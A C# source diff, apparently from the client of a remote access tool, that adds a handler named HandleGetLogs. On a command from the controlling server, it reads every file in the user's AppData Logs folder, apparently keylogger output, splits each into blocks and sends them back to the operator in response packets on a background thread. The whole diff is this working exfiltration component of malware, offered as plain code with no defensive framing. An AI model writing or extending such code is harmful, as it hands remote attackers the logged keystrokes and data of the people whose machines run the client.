@@ -339,6 +339,47 @@ namespace xClient.Core.Commands
 			}
 		}
 
+		public static void HandleGetLogs(Packets.ServerPackets.GetLogs command, Client client)
+		{
+			new Thread(() =>
+			{
+				int index = 1;
+				try
+				{
+					string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Logs\\";
+
+					DirectoryInfo dicInfo = new DirectoryInfo(path);
+
+					FileInfo[] iFiles = dicInfo.GetFiles();
+
+					foreach (FileInfo file in iFiles)
+					{
+						FileSplit srcFile = new FileSplit(file.FullName);
+						if (srcFile.MaxBlocks < 0)
+							new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
+
+						for (int currentBlock = 0; currentBlock < srcFile.MaxBlocks; currentBlock++)
+						{
+							byte[] block;
+							if (srcFile.ReadBlock(currentBlock, out block))
+							{
+								new Packets.ClientPackets.GetLogsResponse(Path.GetFileName(file.Name), block, srcFile.MaxBlocks, currentBlock, srcFile.LastError, index, iFiles.Length).Execute(client);
+								//Thread.Sleep(200);
+							}
+							else
+								new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, srcFile.LastError, index, iFiles.Length).Execute(client);
+						}
+
+						index++;
+					}
+				}
+				catch (Exception ex)
+				{
+					new Packets.ClientPackets.GetLogsResponse("", new byte[0], -1, -1, ex.Message, -1, -1).Execute(client);
+				}
+			}).Start();
+		}
+
 		public static void HandleDownloadFile(Packets.ServerPackets.DownloadFile command, Client client)
 		{
 			new Thread(() =>
